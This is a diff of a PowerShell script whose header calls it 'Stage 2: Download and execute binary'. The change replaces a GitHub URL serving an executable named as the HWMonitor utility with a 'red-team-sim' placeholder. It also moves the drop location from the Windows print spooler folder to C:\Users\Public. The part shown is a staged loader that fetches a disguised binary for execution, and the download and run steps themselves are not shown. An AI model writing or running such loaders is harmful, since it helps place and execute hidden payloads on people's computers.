@@ -1,15 +1,14 @@
-# === Stage 2: Download and execute binary from GitHub to C:\Windows\System32\spool\PRINTERS ===
+# === Stage 2: Download and execute binary to C:\Users\Public ===
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$BinaryUrl = "https://github.com/mibomboclaaat/wwdtesting/raw/refs/heads/main/hwmonitor_1.58.exe"
-$DestinationDir = "C:\Windows\System32\spool\PRINTERS"
+$BinaryUrl = "https://raw.githubusercontent.com/your-org/red-team-sim/main/HWMonitor_x64.exe"
+$DestinationDir = "C:\Users\Public"
 $DestinationPath = Join-Path $DestinationDir "HWMonitor_x64.exe"
 
 try {
-    # Test if directory exists
     if (-Not (Test-Path -Path $DestinationDir)) {
-        Write-Host "[-] Destination directory does not exist: $DestinationDir"
+        Write-Host "[-] Directory does not exist: $DestinationDir"
         exit 1
     }
 
